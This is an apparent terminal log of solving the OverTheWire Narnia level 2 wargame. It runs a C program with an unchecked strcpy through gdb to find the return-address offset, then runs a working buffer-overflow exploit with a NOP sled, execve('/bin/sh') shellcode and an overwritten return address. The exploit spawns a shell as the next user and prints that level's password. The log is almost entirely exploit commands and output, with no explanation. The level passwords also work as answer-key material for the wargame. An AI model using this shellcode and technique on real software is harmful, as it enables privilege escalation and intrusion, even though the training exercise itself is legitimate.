Terminal  
===  
```  
ssh narnia2@narnia.labs.overthewire.org  
narnia2@narnia.labs.overthewire.org's password: nairiepecu <enter>  
narnia2@melinda:~$ cd /narnia  
narnia2@melinda:/narnia$ cat narnia2.c
/*
    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
	char buf[128];

	if(argc == 1){
		printf("Usage: %s argument\n", argv[0]);
		exit(1);
	}
	strcpy(buf,argv[1]);
	printf("%s", buf);

	return 0;
}  
narnia2@melinda:/narnia$ gdb -q ./narnia2  
Reading symbols from ./narnia2...(no debugging symbols found)...done.  
(gdb) disass main
Dump of assembler code for function main:
   0x0804845d <+0>:	push   %ebp
   0x0804845e <+1>:	mov    %esp,%ebp
   0x08048460 <+3>:	and    $0xfffffff0,%esp
   0x08048463 <+6>:	sub    $0x90,%esp
   0x08048469 <+12>:	cmpl   $0x1,0x8(%ebp)
   0x0804846d <+16>:	jne    0x8048490 <main+51>
   0x0804846f <+18>:	mov    0xc(%ebp),%eax
   0x08048472 <+21>:	mov    (%eax),%eax
   0x08048474 <+23>:	mov    %eax,0x4(%esp)
   0x08048478 <+27>:	movl   $0x8048560,(%esp)
   0x0804847f <+34>:	call   0x8048310 <printf@plt>
   0x08048484 <+39>:	movl   $0x1,(%esp)
   0x0804848b <+46>:	call   0x8048340 <exit@plt>
   0x08048490 <+51>:	mov    0xc(%ebp),%eax
   0x08048493 <+54>:	add    $0x4,%eax
   0x08048496 <+57>:	mov    (%eax),%eax
   0x08048498 <+59>:	mov    %eax,0x4(%esp)
   0x0804849c <+63>:	lea    0x10(%esp),%eax
   0x080484a0 <+67>:	mov    %eax,(%esp)
   0x080484a3 <+70>:	call   0x8048320 <strcpy@plt>
   0x080484a8 <+75>:	lea    0x10(%esp),%eax
   0x080484ac <+79>:	mov    %eax,0x4(%esp)
   0x080484b0 <+83>:	movl   $0x8048574,(%esp)
   0x080484b7 <+90>:	call   0x8048310 <printf@plt>
   0x080484bc <+95>:	mov    $0x0,%eax
---Type <return> to continue, or q <return> to quit---
   0x080484c1 <+100>:	leave  
   0x080484c2 <+101>:	ret    
End of assembler dump.  
(gdb) r $(python -c 'print "A"*140 + "ABCD"')
Starting program: /games/narnia/narnia2 $(python -c 'print "A"*140 + "ABCD"')

Program received signal SIGSEGV, Segmentation fault.
0x44434241 in ?? ()
(gdb) x/300x $esp
0xffffd650:	0x00000000	0xffffd6e4	0xffffd6f0	0xf7feacca
0xffffd660:	0x00000002	0xffffd6e4	0xffffd684	0x08049768
0xffffd670:	0x0804821c	0xf7fc9000	0x00000000	0x00000000
0xffffd680:	0x00000000	0x241cfa69	0x1cc57e79	0x00000000
0xffffd690:	0x00000000	0x00000000	0x00000002	0x08048360
0xffffd6a0:	0x00000000	0xf7ff04c0	0xf7e3b9e9	0xf7ffd000
0xffffd6b0:	0x00000002	0x08048360	0x00000000	0x08048381
0xffffd6c0:	0x0804845d	0x00000002	0xffffd6e4	0x080484d0
0xffffd6d0:	0x08048540	0xf7feb160	0xffffd6dc	0x0000001c
0xffffd6e0:	0x00000002	0xffffd810	0xffffd826	0x00000000
0xffffd6f0:	0xffffd8b7	0xffffd8cd	0xffffd8dd	0xffffd8f1
0xffffd700:	0xffffd914	0xffffd928	0xffffd931	0xffffd93e
0xffffd710:	0xffffde5f	0xffffde6a	0xffffde75	0xffffded3
0xffffd720:	0xffffdeea	0xffffdef9	0xffffdf05	0xffffdf16
0xffffd730:	0xffffdf1f	0xffffdf32	0xffffdf3a	0xffffdf4a
0xffffd740:	0xffffdf80	0xffffdfa0	0xffffdfc0	0x00000000
0xffffd750:	0x00000020	0xf7fdac60	0x00000021	0xf7fda000
0xffffd760:	0x00000010	0x0f8bfbff	0x00000006	0x00001000
0xffffd770:	0x00000011	0x00000064	0x00000003	0x08048034
0xffffd780:	0x00000004	0x00000020	0x00000005	0x00000008
0xffffd790:	0x00000007	0xf7fdc000	0x00000008	0x00000000
0xffffd7a0:	0x00000009	0x08048360	0x0000000b	0x000036b2
0xffffd7b0:	0x0000000c	0x000036b2	0x0000000d	0x000036b2
0xffffd7c0:	0x0000000e	0x000036b2	0x00000017	0x00000000
0xffffd7d0:	0x00000019	0xffffd7fb	0x0000001f	0xffffdfe2
0xffffd7e0:	0x0000000f	0xffffd80b	0x00000000	0x00000000
---Type <return> to continue, or q <return> to quit---
0xffffd7f0:	0x00000000	0x00000000	0x3c000000	0x2d75810c
0xffffd800:	0x1dcb6dd8	0x4babdac5	0x6902d360	0x00363836
0xffffd810:	0x6d61672f	0x6e2f7365	0x696e7261	0x616e2f61
0xffffd820:	0x61696e72	0x41410032	0x41414141	0x41414141
0xffffd830:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd840:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd850:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd860:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd870:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd880:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd890:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd8a0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd8b0:	0x42414141	0x58004443	0x535f4744	0x49535345
0xffffd8c0:	0x495f4e4f	0x31313d44	0x39353033	0x45485300
0xffffd8d0:	0x2f3d4c4c	0x2f6e6962	0x68736162	0x52455400
0xffffd8e0:	0x74783d4d	0x2d6d7265	0x63363532	0x726f6c6f
0xffffd8f0:	0x48535300	0x494c435f	0x3d544e45	0x312e3836
0xffffd900:	0x322e3233	0x312e3234	0x36203933	0x38313030
0xffffd910:	0x00323220	0x5f485353	0x3d595454	0x7665642f
0xffffd920:	0x7374702f	0x0031322f	0x415f434c	0x433d4c4c
0xffffd930:	0x45535500	0x616e3d52	0x61696e72	0x534c0032
0xffffd940:	0x4c4f435f	0x3d53524f	0x303d7372	0x3d69643a
0xffffd950:	0x333b3130	0x6e6c3a34	0x3b31303d	0x6d3a3633
0xffffd960:	0x30303d68	0x3d69703a	0x333b3034	0x6f733a33
0xffffd970:	0x3b31303d	0x643a3533	0x31303d6f	0x3a35333b
0xffffd980:	0x343d6462	0x33333b30	0x3a31303b	0x343d6463
---Type <return> to continue, or q <return> to quit---
0xffffd990:	0x33333b30	0x3a31303b	0x343d726f	0x31333b30
0xffffd9a0:	0x3a31303b	0x333d7573	0x31343b37	0x3d67733a
0xffffd9b0:	0x343b3033	0x61633a33	0x3b30333d	0x743a3134
0xffffd9c0:	0x30333d77	0x3a32343b	0x333d776f	0x32343b34
0xffffd9d0:	0x3d74733a	0x343b3733	0x78653a34	0x3b31303d
0xffffd9e0:	0x2a3a3233	0x7261742e	0x3b31303d	0x2a3a3133
0xffffd9f0:	0x7a67742e	0x3b31303d	0x2a3a3133	0x6a72612e
0xffffda00:	0x3b31303d	0x2a3a3133	0x7a61742e	0x3b31303d
0xffffda10:	0x2a3a3133	0x687a6c2e	0x3b31303d	0x2a3a3133
0xffffda20:	0x6d7a6c2e	0x31303d61	0x3a31333b	0x6c742e2a
0xffffda30:	0x31303d7a	0x3a31333b	0x78742e2a	0x31303d7a
0xffffda40:	0x3a31333b	0x697a2e2a	0x31303d70	0x3a31333b
0xffffda50:	0x3d7a2e2a	0x333b3130	0x2e2a3a31	0x31303d5a
0xffffda60:	0x3a31333b	0x7a642e2a	0x3b31303d	0x2a3a3133
0xffffda70:	0x3d7a672e	0x333b3130	0x2e2a3a31	0x303d7a6c
0xffffda80:	0x31333b31	0x782e2a3a	0x31303d7a	0x3a31333b
0xffffda90:	0x7a622e2a	0x31303d32	0x3a31333b	0x7a622e2a
0xffffdaa0:	0x3b31303d	0x2a3a3133	0x7a62742e	0x3b31303d
0xffffdab0:	0x2a3a3133	0x7a62742e	0x31303d32	0x3a31333b
0xffffdac0:	0x7a742e2a	0x3b31303d	0x2a3a3133	0x6265642e
0xffffdad0:	0x3b31303d	0x2a3a3133	0x6d70722e	0x3b31303d
0xffffdae0:	0x2a3a3133	0x72616a2e	0x3b31303d	0x2a3a3133
0xffffdaf0:	0x7261772e	0x3b31303d	0x2a3a3133	0x7261652e  
(gdb) r $(python -c'print "\x90"*116 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80" + "\x50\xd8\xff\xff"')  
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /games/narnia/narnia2 $(python -c'print "\x90"*116 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80" + "\x50\xd8\xff\xff"')
process 12059 is executing new program: /bin/dash  
$ exit
[Inferior 1 (process 12059) exited with code 0177]
(gdb) quit  
narnia2@melinda:/narnia$ ./narnia2 $(python -c'print "\x90"*116 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80" + "\x50\xd8\xff\xff"')  
$ whoami
narnia3
$ cat /etc/narnia_pass/narnia3
vaequeezee

```
